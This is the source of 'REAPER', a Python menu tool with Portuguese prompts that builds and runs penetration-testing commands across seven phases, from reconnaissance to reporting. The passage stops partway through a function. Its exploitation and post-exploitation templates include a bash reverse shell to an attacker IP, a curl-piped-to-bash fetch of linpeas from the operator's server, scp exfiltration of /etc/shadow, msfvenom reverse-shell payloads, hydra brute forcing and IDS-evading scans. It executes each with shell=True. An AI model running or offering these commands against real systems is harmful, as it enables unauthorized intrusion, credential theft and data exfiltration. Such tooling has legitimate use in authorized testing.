#!/usr/bin/env python3
# ============================================================
#  REAPER — Recon, Exploit, Analysis & Post-exploitation
#           Reporting Engine
#  Autor: DarkReaper
# ============================================================

import os, sys, json, datetime, shutil, subprocess
from pathlib import Path
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.prompt import Prompt, Confirm
from rich.rule import Rule
from rich.align import Align
from rich import box
from rich.columns import Columns

console = Console()

PHASE_COLORS = ["cyan","green","magenta","yellow","red","bright_red","blue"]

# ── Ferramentas executáveis por fase ────────────────────────
# Cada ferramenta tem: nome, descrição, lista de parâmetros a pedir, template do comando
# {TARGET} = IP/domínio alvo do projecto  {PORTA} = porto
TOOL_DEFINITIONS = {

    # ── FASE 1 — Reconhecimento ──────────────────────────────
    1: [
        {
            "name": "whois",
            "desc": "Registo de domínio, IPs e contactos",
            "params": [
                {"key": "alvo", "label": "Domínio ou IP alvo", "default": "{TARGET}"},
            ],
            "cmd": "whois {alvo}",
        },
        {
            "name": "nslookup",
            "desc": "Resolução DNS básica",
            "params": [
                {"key": "alvo", "label": "Domínio", "default": "{TARGET}"},
            ],
            "cmd": "nslookup {alvo}",
        },
        {
            "name": "dig",
            "desc": "DNS completo — A, MX, NS, TXT",
            "params": [
                {"key": "alvo",  "label": "Domínio",              "default": "{TARGET}"},
                {"key": "tipo",  "label": "Tipo de registo",       "default": "ANY"},
            ],
            "cmd": "dig {alvo} {tipo}",
        },
        {
            "name": "dig axfr",
            "desc": "Tentativa de transferência de zona DNS",
            "params": [
                {"key": "dominio",    "label": "Domínio",        "default": "{TARGET}"},
                {"key": "dns_server", "label": "Servidor DNS",   "default": "8.8.8.8"},
            ],
            "cmd": "dig axfr {dominio} @{dns_server}",
        },
        {
            "name": "theHarvester",
            "desc": "Emails, subdomínios, IPs via OSINT",
            "params": [
                {"key": "dominio", "label": "Domínio alvo",    "default": "{TARGET}"},
                {"key": "fonte",   "label": "Fonte (all/google/bing)", "default": "all"},
            ],
            "cmd": "theHarvester -d {dominio} -b {fonte}",
        },
        {
            "name": "netdiscover",
            "desc": "Descoberta de hosts na rede local",
            "params": [
                {"key": "rede", "label": "Rede (ex: 192.168.1.0/24)", "default": ""},
            ],
            "cmd": "netdiscover -r {rede}",
        },
        {
            "name": "ping sweep (nmap)",
            "desc": "Hosts activos na rede",
            "params": [
                {"key": "rede", "label": "Rede (ex: 192.168.1.0/24)", "default": ""},
            ],
            "cmd": "nmap -sn {rede}",
        },
        {
            "name": "traceroute",
            "desc": "Rota de rede até ao alvo",
            "params": [
                {"key": "alvo", "label": "IP / Domínio alvo", "default": "{TARGET}"},
            ],
            "cmd": "traceroute {alvo}",
        },
    ],

    # ── FASE 2 — Scanning ────────────────────────────────────
    2: [
        {
            "name": "nmap básico",
            "desc": "Versões, scripts padrão e SO",
            "params": [
                {"key": "alvo", "label": "IP / Domínio alvo", "default": "{TARGET}"},
            ],
            "cmd": "nmap -sV -sC -O {alvo}",
        },
        {
            "name": "nmap completo",
            "desc": "Todos os portos, agressivo",
            "params": [
                {"key": "alvo",   "label": "IP / Domínio alvo",   "default": "{TARGET}"},
                {"key": "output", "label": "Ficheiro de output",   "default": "scan_{alvo}.txt"},
            ],
            "cmd": "nmap -sS -sV -sC -O -p- -T4 -A {alvo} -oN {output}",
        },
        {
            "name": "nmap UDP",
            "desc": "Top 100 portos UDP",
            "params": [
                {"key": "alvo", "label": "IP / Domínio alvo", "default": "{TARGET}"},
            ],
            "cmd": "nmap -sU --top-ports 100 {alvo}",
        },
        {
            "name": "nmap scripts vuln",
            "desc": "Scripts NSE de vulnerabilidades",
            "params": [
                {"key": "alvo",   "label": "IP / Domínio alvo", "default": "{TARGET}"},
                {"key": "portos", "label": "Portos (ex: 80,443 ou all)", "default": ""},
            ],
            "cmd": "nmap --script vuln -p {portos} {alvo}",
        },
        {
            "name": "nmap evasão firewall",
            "desc": "Fragmentação + decoy para evasão IDS",
            "params": [
                {"key": "alvo", "label": "IP / Domínio alvo", "default": "{TARGET}"},
            ],
            "cmd": "nmap -f -D RND:10 {alvo}",
        },
        {
            "name": "masscan",
            "desc": "Scan rápido de todos os portos",
            "params": [
                {"key": "alvo", "label": "IP / Domínio alvo", "default": "{TARGET}"},
                {"key": "rate", "label": "Rate (pacotes/seg)",  "default": "1000"},
            ],
            "cmd": "masscan -p1-65535 {alvo} --rate={rate}",
        },
    ],

    # ── FASE 3 — Enumeração ──────────────────────────────────
    3: [
        {
            "name": "gobuster",
            "desc": "Fuzzing de directorias web",
            "params": [
                {"key": "url",      "label": "URL alvo (ex: http://192.168.1.1)", "default": "http://{TARGET}"},
                {"key": "wordlist", "label": "Wordlist", "default": "/usr/share/wordlists/dirb/common.txt"},
                {"key": "ext",      "label": "Extensões (ex: php,html,txt)",      "default": "php,html,txt"},
                {"key": "output",   "label": "Ficheiro output",                    "default": "gobuster_{TARGET}.txt"},
            ],
            "cmd": "gobuster dir -u {url} -w {wordlist} -x {ext} -o {output}",
        },
        {
            "name": "feroxbuster",
            "desc": "Fuzzing recursivo de directorias web",
            "params": [
                {"key": "url",      "label": "URL alvo (ex: http://192.168.1.1)", "default": "http://{TARGET}"},
                {"key": "wordlist", "label": "Wordlist", "default": "/usr/share/wordlists/dirb/common.txt"},
                {"key": "ext",      "label": "Extensões (ex: php,html)",          "default": "php,html"},
                {"key": "depth",    "label": "Profundidade recursiva",             "default": "3"},
                {"key": "output",   "label": "Ficheiro output",                    "default": "ferox_{TARGET}.txt"},
            ],
            "cmd": "feroxbuster -u {url} -w {wordlist} -x {ext} -d {depth} -o {output}",
        },
        {
            "name": "dirb",
            "desc": "Enumeração de directorias web",
            "params": [
                {"key": "url",      "label": "URL alvo",  "default": "http://{TARGET}"},
                {"key": "wordlist", "label": "Wordlist (ENTER para padrão)", "default": ""},
            ],
            "cmd": "dirb {url} {wordlist}",
        },
        {
            "name": "nikto",
            "desc": "Scanner de vulnerabilidades web",
            "params": [
                {"key": "alvo",   "label": "IP / URL alvo",       "default": "{TARGET}"},
                {"key": "porto",  "label": "Porto",                "default": "80"},
                {"key": "output", "label": "Ficheiro output",      "default": "nikto_{TARGET}.txt"},
            ],
            "cmd": "nikto -h {alvo} -p {porto} -o {output}",
        },
        {
            "name": "wpscan",
            "desc": "Scan WordPress — users, plugins, temas",
            "params": [
                {"key": "url",         "label": "URL WordPress",          "default": "http://{TARGET}"},
                {"key": "enumerate",   "label": "Enumeração (u=users, p=plugins, t=temas, vp=plugins vuln)", "default": "u,vp"},
                {"key": "wordlist",    "label": "Wordlist passwords (ENTER para saltar)", "default": ""},
            ],
            "cmd": "wpscan --url {url} -e {enumerate} --passwords {wordlist}",
        },
        {
            "name": "enum4linux",
            "desc": "Enumeração SMB/Samba completa",
            "params": [
                {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
            ],
            "cmd": "enum4linux -a {alvo}",
        },
        {
            "name": "smbclient",
            "desc": "Listar partilhas SMB",
            "params": [
                {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
            ],
            "cmd": "smbclient -L //{alvo} -N",
        },
        {
            "name": "smbmap",
            "desc": "Mapeamento de partilhas e permissões SMB",
            "params": [
                {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
            ],
            "cmd": "smbmap -H {alvo}",
        },
        {
            "name": "nikto SSL",
            "desc": "Scanner web com SSL/HTTPS",
            "params": [
                {"key": "alvo",  "label": "IP / URL alvo", "default": "{TARGET}"},
                {"key": "porto", "label": "Porto SSL",      "default": "443"},
            ],
            "cmd": "nikto -h {alvo} -p {porto} -ssl",
        },
        {
            "name": "snmpwalk",
            "desc": "Enumeração SNMP",
            "params": [
                {"key": "alvo",      "label": "IP alvo",          "default": "{TARGET}"},
                {"key": "community", "label": "Community string",  "default": "public"},
            ],
            "cmd": "snmpwalk -v2c -c {community} {alvo}",
        },
        {
            "name": "nmap ssh-enum",
            "desc": "Métodos de autenticação SSH",
            "params": [
                {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
            ],
            "cmd": "nmap -p 22 --script ssh-auth-methods {alvo}",
        },
        {
            "name": "ftp anónimo",
            "desc": "Testar acesso FTP anónimo",
            "params": [
                {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
            ],
            "cmd": "ftp {alvo}",
        },
    ],

    # ── FASE 4 — Análise de Vulnerabilidades ─────────────────
    4: [
        {
            "name": "nmap --script vuln",
            "desc": "Scripts NSE de vulnerabilidades em todos os portos",
            "params": [
                {"key": "alvo",   "label": "IP / Domínio alvo",              "default": "{TARGET}"},
                {"key": "portos", "label": "Portos (ENTER para todos abertos)", "default": ""},
            ],
            "cmd": "nmap --script vuln -sV {alvo}",
        },
        {
            "name": "searchsploit",
            "desc": "Pesquisa local de exploits no ExploitDB",
            "params": [
                {"key": "servico", "label": "Serviço / software",  "default": ""},
                {"key": "versao",  "label": "Versão (ex: 2.4.49)", "default": ""},
            ],
            "cmd": "searchsploit {servico} {versao}",
        },
        {
            "name": "searchsploit -x",
            "desc": "Ver código de um exploit específico",
            "params": [
                {"key": "path", "label": "Caminho do exploit (ex: linux/remote/12345.py)", "default": ""},
            ],
            "cmd": "searchsploit -x {path}",
        },
        {
            "name": "searchsploit -m",
            "desc": "Copiar exploit para directoria actual",
            "params": [
                {"key": "path", "label": "Caminho do exploit", "default": ""},
            ],
            "cmd": "searchsploit -m {path}",
        },
        {
            "name": "nmap vulners",
            "desc": "CVEs automáticos por versão de serviço",
            "params": [
                {"key": "alvo", "label": "IP / Domínio alvo", "default": "{TARGET}"},
            ],
            "cmd": "nmap --script vulners -sV {alvo}",
        },
        {
            "name": "nuclei",
            "desc": "Scanner de vulnerabilidades web com templates",
            "params": [
                {"key": "url",       "label": "URL alvo",                "default": "http://{TARGET}"},
                {"key": "severity",  "label": "Severidade (critical,high,medium)", "default": "critical,high"},
            ],
            "cmd": "nuclei -u {url} -s {severity}",
        },
        {
            "name": "msfconsole search",
            "desc": "Pesquisar módulos no Metasploit",
            "params": [
                {"key": "termo", "label": "Serviço / CVE / produto", "default": ""},
            ],
            "cmd": "msfconsole -q -x 'search {termo}; exit'",
        },
    ],

    # ── FASE 5 — Exploração ──────────────────────────────────
    5: [
        {
            "name": "hydra SSH",
            "desc": "Brute force SSH",
            "params": [
                {"key": "alvo",     "label": "IP alvo",                          "default": "{TARGET}"},
                {"key": "user",     "label": "Utilizador (ou ficheiro -L)",       "default": "root"},
                {"key": "wordlist", "label": "Wordlist passwords",                "default": "/usr/share/wordlists/rockyou.txt"},
                {"key": "threads",  "label": "Threads",                           "default": "4"},
            ],
            "cmd": "hydra -l {user} -P {wordlist} -t {threads} ssh://{alvo}",
        },
        {
            "name": "hydra FTP",
            "desc": "Brute force FTP",
            "params": [
                {"key": "alvo",     "label": "IP alvo",          "default": "{TARGET}"},
                {"key": "user",     "label": "Utilizador",        "default": "admin"},
                {"key": "wordlist", "label": "Wordlist passwords","default": "/usr/share/wordlists/rockyou.txt"},
            ],
            "cmd": "hydra -l {user} -P {wordlist} ftp://{alvo}",
        },
        {
            "name": "hydra HTTP form",
            "desc": "Brute force formulário web",
            "params": [
                {"key": "alvo",     "label": "IP alvo",                        "default": "{TARGET}"},
                {"key": "path",     "label": "Path do login (ex: /login.php)", "default": "/login.php"},
                {"key": "user",     "label": "Utilizador",                     "default": "admin"},
                {"key": "wordlist", "label": "Wordlist passwords",             "default": "/usr/share/wordlists/rockyou.txt"},
                {"key": "fail_str", "label": "String de falha (ex: Invalid)",  "default": "Invalid"},
            ],
            "cmd": "hydra -l {user} -P {wordlist} {alvo} http-post-form '{path}:username=^USER^&password=^PASS^:F={fail_str}'",
        },
        {
            "name": "john",
            "desc": "Cracking de hashes com John the Ripper",
            "params": [
                {"key": "hash_file","label": "Ficheiro com hash(es)",           "default": "hash.txt"},
                {"key": "wordlist", "label": "Wordlist",                        "default": "/usr/share/wordlists/rockyou.txt"},
                {"key": "formato",  "label": "Formato (ex: md5, sha256, auto)", "default": ""},
            ],
            "cmd": "john --wordlist={wordlist} {hash_file}",
        },
        {
            "name": "hashcat",
            "desc": "Cracking GPU de hashes",
            "params": [
                {"key": "modo",     "label": "Modo (-m): 0=MD5 100=SHA1 1800=sha512crypt", "default": "0"},
                {"key": "hash_file","label": "Ficheiro com hash",               "default": "hash.txt"},
                {"key": "wordlist", "label": "Wordlist",                        "default": "/usr/share/wordlists/rockyou.txt"},
            ],
            "cmd": "hashcat -m {modo} {hash_file} {wordlist}",
        },
        {
            "name": "msfvenom payload",
            "desc": "Gerar payload de reverse shell",
            "params": [
                {"key": "payload",  "label": "Payload (ex: linux/x86/shell_reverse_tcp)", "default": "linux/x86/shell_reverse_tcp"},
                {"key": "lhost",    "label": "Teu IP (LHOST)",                            "default": ""},
                {"key": "lport",    "label": "Porta (LPORT)",                             "default": "4444"},
                {"key": "formato",  "label": "Formato (elf/exe/py/php/raw)",              "default": "elf"},
                {"key": "output",   "label": "Ficheiro output",                           "default": "shell.elf"},
            ],
            "cmd": "msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {formato} -o {output}",
        },
        {
            "name": "reverse shell bash",
            "desc": "Gerar comando de reverse shell Bash",
            "params": [
                {"key": "lhost", "label": "Teu IP (ouvinte)", "default": ""},
                {"key": "lport", "label": "Porta",            "default": "4444"},
            ],
            "cmd": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        },
        {
            "name": "netcat listener",
            "desc": "Abrir listener para receber reverse shell",
            "params": [
                {"key": "lport", "label": "Porta de escuta", "default": "4444"},
            ],
            "cmd": "nc -lvnp {lport}",
        },
        {
            "name": "sqlmap",
            "desc": "SQL Injection automático",
            "params": [
                {"key": "url",    "label": "URL vulnerável (ex: http://alvo/page?id=1)", "default": ""},
                {"key": "level",  "label": "Nível (1-5)",                                "default": "3"},
                {"key": "risk",   "label": "Risco (1-3)",                                "default": "2"},
            ],
            "cmd": "sqlmap -u '{url}' --level={level} --risk={risk} --dbs --batch",
        },
    ],

    # ── FASE 6 — Pós-Exploração ──────────────────────────────
    6: [
        {
            "name": "whoami & id",
            "desc": "Utilizador actual e grupos",
            "params": [],
            "cmd": "whoami && id",
        },
        {
            "name": "uname",
            "desc": "Kernel, arquitectura e sistema",
            "params": [],
            "cmd": "uname -a && cat /etc/os-release",
        },
        {
            "name": "sudo -l",
            "desc": "Comandos sudo sem password",
            "params": [],
            "cmd": "sudo -l",
        },
        {
            "name": "SUID binários",
            "desc": "Procurar binários com SUID activado",
            "params": [],
            "cmd": "find / -perm -4000 2>/dev/null",
        },
        {
            "name": "SGID binários",
            "desc": "Procurar binários com SGID activado",
            "params": [],
            "cmd": "find / -perm -2000 2>/dev/null",
        },
        {
            "name": "crontab",
            "desc": "Tarefas agendadas do sistema",
            "params": [],
            "cmd": "crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null",
        },
        {
            "name": "capabilities",
            "desc": "Capabilities especiais de binários",
            "params": [],
            "cmd": "getcap -r / 2>/dev/null",
        },
        {
            "name": "linpeas (remoto)",
            "desc": "Executa linpeas via HTTP do teu servidor",
            "params": [
                {"key": "lhost", "label": "Teu IP (servidor HTTP)", "default": ""},
                {"key": "output","label": "Ficheiro output",         "default": "linpeas_out.txt"},
            ],
            "cmd": "curl http://{lhost}/linpeas.sh | bash | tee {output}",
        },
        {
            "name": "linpeas (local)",
            "desc": "Executa linpeas já transferido",
            "params": [
                {"key": "output","label": "Ficheiro output", "default": "linpeas_out.txt"},
            ],
            "cmd": "chmod +x linpeas.sh && ./linpeas.sh | tee {output}",
        },
        {
            "name": "/etc/passwd",
            "desc": "Listar utilizadores do sistema",
            "params": [],
            "cmd": "cat /etc/passwd",
        },
        {
            "name": "history",
            "desc": "Histórico de comandos do utilizador",
            "params": [],
            "cmd": "cat ~/.bash_history",
        },
        {
            "name": "rede interna",
            "desc": "Interfaces, IPs e portos internos activos",
            "params": [],
            "cmd": "ip a && ss -tulnp",
        },
        {
            "name": "exfiltração SCP",
            "desc": "Copiar ficheiro para a tua máquina",
            "params": [
                {"key": "ficheiro", "label": "Ficheiro a exfiltrar",       "default": "/etc/shadow"},
                {"key": "lhost",    "label": "Teu IP",                     "default": ""},
                {"key": "dest",     "label": "Destino (ex: /tmp/loot/)",   "default": "/tmp/loot/"},
            ],
            "cmd": "scp {ficheiro} {lhost}:{dest}",
        },
    ],
}

# ── Estrutura das 7 fases ───────────────────────────────────
PHASES = [
    {
        "id": 1, "name": "RECONHECIMENTO",
        "subtitle": "Recolha passiva de informação",
        "icon": "🔍",
        "desc": "Recolha de informação sem interagir directamente com o alvo. Mapeamento da superfície de ataque.",
        "fields": [
            ("alvo_ip",      "IP / Domínio alvo"),
            ("rede",         "Rede (ex: 192.168.1.0/24)"),
            ("hosts_ativos", "Hosts activos encontrados"),
            ("dns_info",     "Informação DNS recolhida"),
            ("emails",       "Emails / utilizadores encontrados"),
            ("notas",        "Notas gerais"),
        ]
    },
    {
        "id": 2, "name": "SCANNING / VARREDURA",
        "subtitle": "Varredura activa de portos e serviços",
        "icon": "📡",
        "desc": "Interacção directa com o alvo para identificar portos abertos, serviços e sistema operativo.",
        "fields": [
            ("portos_tcp",  "Portos TCP abertos"),
            ("portos_udp",  "Portos UDP abertos"),
            ("servicos",    "Serviços identificados"),
            ("so",          "Sistema Operativo detectado"),
            ("versoes",     "Versões de serviços"),
            ("notas",       "Notas gerais"),
        ]
    },
    {
        "id": 3, "name": "ENUMERAÇÃO",
        "subtitle": "Extracção detalhada de informação dos serviços",
        "icon": "🗂️",
        "desc": "Enumeração profunda de cada serviço — utilizadores, directorias, versões, configurações.",
        "fields": [
            ("diretorias_web","Directorias/ficheiros web encontrados"),
            ("utilizadores",  "Utilizadores enumerados"),
            ("partilhas_smb", "Partilhas SMB encontradas"),
            ("cms_info",      "CMS / versão (WordPress, Joomla, etc.)"),
            ("plugins_vulns", "Plugins / componentes vulneráveis"),
            ("notas",         "Notas gerais"),
        ]
    },
    {
        "id": 4, "name": "ANÁLISE DE VULNERABILIDADES",
        "subtitle": "Identificação e validação de vulnerabilidades",
        "icon": "🔬",
        "desc": "Análise das vulnerabilidades encontradas, pesquisa de exploits e validação de CVEs.",
        "fields": [
            ("cves",         "CVEs identificados"),
            ("exploits",     "Exploits disponíveis encontrados"),
            ("risco",        "Nível de risco (Crítico/Alto/Médio/Baixo)"),
            ("vetor_ataque", "Vector de ataque principal"),
            ("notas",        "Notas gerais"),
        ]
    },
    {
        "id": 5, "name": "EXPLORAÇÃO",
        "subtitle": "Execução de exploits e obtenção de acesso",
        "icon": "💥",
        "desc": "Execução controlada de exploits para obter acesso ao sistema alvo.",
        "fields": [
            ("exploit_usado","Exploit / módulo utilizado"),
            ("credenciais",  "Credenciais obtidas"),
            ("acesso",       "Tipo de acesso obtido"),
            ("user_obtido",  "Utilizador com que entrou"),
            ("flags",        "Flags / ficheiros sensíveis"),
            ("notas",        "Notas gerais"),
        ]
    },
    {
        "id": 6, "name": "PÓS-EXPLORAÇÃO",
        "subtitle": "Escalada de privilégios e persistência",
        "icon": "🏴",
        "desc": "Após acesso inicial — escalada de privilégios, recolha interna e movimentação lateral.",
        "fields": [
            ("privilegio",     "Nível de privilégio obtido"),
            ("metodo_privesc", "Método de escalada usado"),
            ("root_flag",      "Flag de root / ficheiros sensíveis"),
            ("dados_exfil",    "Dados exfiltrados"),
            ("persistencia",   "Método de persistência instalado"),
            ("notas",          "Notas gerais"),
        ]
    },
    {
        "id": 7, "name": "RELATÓRIO",
        "subtitle": "Documentação e geração do relatório final",
        "icon": "📄",
        "desc": "Compilação de todos os dados recolhidos num relatório profissional.",
        "fields": [
            ("titulo",         "Título do relatório"),
            ("sumario_exec",   "Sumário executivo"),
            ("vulns_criticas", "Vulnerabilidades críticas"),
            ("recomendacoes",  "Recomendações de remediação"),
            ("notas",          "Notas finais"),
        ]
    },
]

# ── Estado global ───────────────────────────────────────────
PROJECT = {
    "name": "", "target": "", "date": "", "tester": "DarkReaper",
    "phases": {str(i): {} for i in range(1, 8)},
}
PROJECT_FILE = ""

# ── Utilitários ─────────────────────────────────────────────
def clear():
    os.system("clear")

def pause():
    console.print("\n[dim]Prima ENTER para continuar...[/dim]")
    input()

def save_project():
    if PROJECT_FILE:
        with open(PROJECT_FILE, "w") as f:
            json.dump(PROJECT, f, indent=2, ensure_ascii=False)

def resolve_defaults(params, target):
    """Substitui {TARGET} nos defaults pelo alvo do projecto."""
    for p in params:
        p["default"] = p["default"].replace("{TARGET}", target)
    return params

# ── Banner ───────────────────────────────────────────────────
def banner():
    clear()
    art = r"""
██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ 
██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝"""
    console.print(Align.center(Text(art, style="bold red")))
    console.print(Align.center(Text(
        "Recon · Exploit · Analysis · Post-exploitation · Reporting Engine", style="dim red")))
    console.print(Align.center(Text("[ DarkReaper ]", style="bold white")))
    console.print(Rule(style="red"))

# ── Menu Principal ───────────────────────────────────────────
def main_menu():
    while True:
        banner()
        proj_info = (f"[bold cyan]{PROJECT['name']}[/bold cyan]  →  "
                     f"[yellow]{PROJECT['target']}[/yellow]  "
                     f"[dim]{PROJECT['date']}[/dim]") \
                    if PROJECT['name'] else "[dim]Nenhum projecto activo[/dim]"
        console.print(Panel(proj_info, title="Projecto Activo", border_style="red", padding=(0,2)))

        prog = Table(box=box.SIMPLE, show_header=False, padding=(0,1))
        prog.add_column(width=4); prog.add_column(width=32); prog.add_column(width=12)
        for ph in PHASES:
            pid   = str(ph["id"])
            fill  = len([v for v in PROJECT["phases"].get(pid,{}).values() if str(v).strip()])
            total = len(ph["fields"])
            c     = PHASE_COLORS[ph["id"]-1]
            st    = f"[green]●[/green] {fill}/{total}" if fill > 0 else f"[dim]○ 0/{total}[/dim]"
            menu_num = ph["id"] + 2
            prog.add_row(f"[{c}][{menu_num}][/{c}]", f"[{c}]{ph['icon']} {ph['name']}[/{c}]", st)
        console.print(Panel(prog, title="7 Passos", border_style="dim red", padding=(0,1)))
        console.print()

        menu = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
        menu.add_column(style="bold cyan", width=8); menu.add_column()
        menu.add_row("[1]",   "Novo Projecto")
        menu.add_row("[2]",   "Carregar Projecto")
        menu.add_row("[3-9]", "Entrar numa fase (3=Fase1 … 9=Fase7)")
        menu.add_row("[R]",   "Gerar Relatório")
        menu.add_row("[Q]",   "Sair")
        console.print(menu)

        ch = Prompt.ask("[bold red]REAPER[/bold red]").strip().upper()
        if ch == "Q":
            console.print("\n[bold red]Sessão terminada. Stay sharp.[/bold red]\n")
            sys.exit(0)
        elif ch == "1": new_project()
        elif ch == "2": load_project_menu()
        elif ch == "R": report_menu()
        elif ch in [str(i) for i in range(3, 10)]:
            phase_menu(int(ch) - 2)

# ── Novo / Carregar Projecto ────────────────────────────────
def new_project():
    global PROJECT, PROJECT_FILE
    banner()
    console.print(Panel("[bold cyan]NOVO PROJECTO[/bold cyan]", border_style="cyan"))
    name   = Prompt.ask("[cyan]Nome do projecto[/cyan]")
    target = Prompt.ask("[cyan]IP / Domínio alvo[/cyan]")
    date   = datetime.date.today().isoformat()
    PROJECT = {"name": name, "target": target, "date": date, "tester": "DarkReaper",
               "phases": {str(i): {} for i in range(1, 8)}}
    PROJECT["phases"]["1"]["alvo_ip"] = target
    safe = name.replace(" ","_").replace("/","-")
    PROJECT_FILE = f"reaper_{safe}_{date}.json"
    save_project()
    console.print(f"\n[green]✔ Projecto criado:[/green] [bold]{PROJECT_FILE}[/bold]")
    pause()

def load_project_menu():
    global PROJECT, PROJECT_FILE
    banner()
    console.print(Panel("[bold cyan]CARREGAR PROJECTO[/bold cyan]", border_style="cyan"))
    files = list(Path(".").glob("reaper_*.json"))
    if not files:
        console.print("[yellow]Nenhum projecto encontrado nesta directoria.[/yellow]")
        pause(); return
    t = Table(box=box.SIMPLE_HEAD, border_style="dim")
    t.add_column("#", style="bold cyan", width=4)
    t.add_column("Ficheiro"); t.add_column("Modificado", style="dim")
    for i, f in enumerate(files, 1):
        mtime = datetime.datetime.fromtimestamp(f.stat().st_mtime).strftime("%Y-%m-%d %H:%M")
        t.add_row(str(i), f.name, mtime)
    console.print(t)
    ch = Prompt.ask("[cyan]Número (ENTER para cancelar)[/cyan]", default="")
    if ch.isdigit() and 1 <= int(ch) <= len(files):
        with open(files[int(ch)-1]) as f:
            PROJECT = json.load(f)
        PROJECT_FILE = str(files[int(ch)-1])
        console.print(f"\n[green]✔ Projecto carregado.[/green]")
        pause()

# ── Menu de Fase ─────────────────────────────────────────────
def phase_menu(phase_id):
    ph    = PHASES[phase_id - 1]
    color = PHASE_COLORS[phase_id - 1]
    tools = TOOL_DEFINITIONS.get(phase_id, [])

    while True:
        banner()
        console.print(Panel(
            f"[{color}]{ph['icon']}  FASE {ph['id']} — {ph['name']}[/{color}]\n[dim]{ph['desc']}[/dim]",
            border_style=color, padding=(0,2)))
        console.print()

        menu = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
        menu.add_column(style=f"bold {color}", width=6); menu.add_column()
        opt_num = 1
        has_tools = bool(tools)
        if has_tools:
            menu.add_row(f"[{opt_num}]", "Escolher e executar ferramenta")
            tool_opt = str(opt_num); opt_num += 1
        else:
            tool_opt = None
        fill_opt = str(opt_num); menu.add_row(f"[{opt_num}]", "Preencher / Editar dados desta fase"); opt_num += 1
        view_opt = str(opt_num); menu.add_row(f"[{opt_num}]", "Ver dados preenchidos")
        menu.add_row("[B]", "Voltar")
        console.print(menu)

        ch = Prompt.ask(f"[{color}]REAPER › Fase {phase_id}[/{color}]").strip().upper()
        if ch == "B": break
        elif ch == tool_opt and has_tools: tool_selector(ph, color, tools)
        elif ch == fill_opt: fill_phase(ph, color)
        elif ch == view_opt: view_phase_data(ph, color)

# ── Selector de Ferramentas ──────────────────────────────────
def tool_selector(ph, color, tools):
    while True:
        banner()
        console.print(Panel(
            f"[{color}]{ph['icon']} FASE {ph['id']} — {ph['name']} › FERRAMENTAS[/{color}]",
            border_style=color))
        console.print()

        t = Table(box=box.ROUNDED, border_style=color,
                  header_style=f"bold {color}", show_lines=True)
        t.add_column("#",           style=f"bold {color}", width=4, justify="center")
        t.add_column("Ferramenta",  style="bold white",    width=20)
        t.add_column("Descrição",   style="dim white",     width=50)

        for i, tool in enumerate(tools, 1):
            t.add_row(str(i), tool["name"], tool["desc"])

        console.print(t)
        console.print()
        console.print("[dim][número] Escolher ferramenta  [B] Voltar[/dim]")

        ch = Prompt.ask(f"[{color}]Escolha[/{color}]").strip().upper()
        if ch == "B": break
        elif ch.isdigit() and 1 <= int(ch) <= len(tools):
            run_tool(ph, color, tools[int(ch)-1])

# ── Executar Ferramenta ──────────────────────────────────────
def run_tool(ph, color, tool):
    banner()
    console.print(Panel(
        f"[{color}]{ph['icon']} FASE {ph['id']} › {tool['name'].upper()}[/{color}]\n"
        f"[dim]{tool['desc']}[/dim]",
        border_style=color))
    console.print()

    target = PROJECT.get("target", "")
    params = resolve_defaults([dict(p) for p in tool["params"]], target)

    # Recolher parâmetros
    values = {}
    if params:
        console.print(f"[{color}]Parâmetros necessários:[/{color}] [dim](ENTER para aceitar valor sugerido)[/dim]\n")
        for p in params:
            d = p["default"]
            # Mostra o valor sugerido apenas uma vez, integrado no label
            if d:
                label_str = f"  [{color}]{p['label']}[/{color}] [bold white]{d}[/bold white]"
            else:
                label_str = f"  [{color}]{p['label']}[/{color}]"
            val = Prompt.ask(label_str, default=d)
            values[p["key"]] = val
    else:
        console.print(f"[dim]Este comando não necessita de parâmetros adicionais.[/dim]\n")

    # Montar comando final
    cmd = tool["cmd"]
    for k, v in values.items():
        cmd = cmd.replace("{" + k + "}", v)

    console.print()
    console.print(Panel(f"[bold green]{cmd}[/bold green]",
                        title="Comando Gerado", border_style="green"))
    console.print()

    # Opções
    opts = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
    opts.add_column(style="bold cyan", width=6); opts.add_column()
    opts.add_row("[1]", "Executar agora neste terminal")
    opts.add_row("[2]", "Guardar comando nas notas da fase")
    opts.add_row("[3]", "Executar E guardar")
    opts.add_row("[B]", "Voltar sem fazer nada")
    console.print(opts)

    ch = Prompt.ask(f"[{color}]Acção[/{color}]").strip().upper()

    if ch in ["1", "3"]:
        console.print(f"\n[yellow]A executar:[/yellow] [bold green]{cmd}[/bold green]\n")
        console.print(Rule(style="dim green"))
        try:
            subprocess.run(cmd, shell=True)
        except KeyboardInterrupt:
            console.print("\n[yellow]Interrompido pelo utilizador.[/yellow]")
        console.print(Rule(style="dim green"))

    if ch in ["2", "3"]:
        phase_data = PROJECT["phases"].get(str(ph["id"]), {})
        existing   = phase_data.get("notas", "")
        ts         = datetime.datetime.now().strftime("%H:%M:%S")
        entry      = f"[{ts}] {tool['name']}: {cmd}"
        phase_data["notas"] = (existing + "\n" + entry).strip()
        PROJECT["phases"][str(ph["id"])] = phase_data
        save_project()
        console.print(f"\n[green]✔ Comando guardado nas notas da fase {ph['id']}.[/green]")

    pause()

# ── Preencher dados ──────────────────────────────────────────
def fill_phase(ph, color):
    banner()
    console.print(Panel(
        f"[{color}]{ph['icon']} FASE {ph['id']} — {ph['name']} › PREENCHER DADOS[/{color}]",
        border_style=color))
    console.print("[dim]ENTER = manter valor actual  |  LIMPAR = apagar campo[/dim]\n")

    phase_data = PROJECT["phases"].get(str(ph["id"]), {})
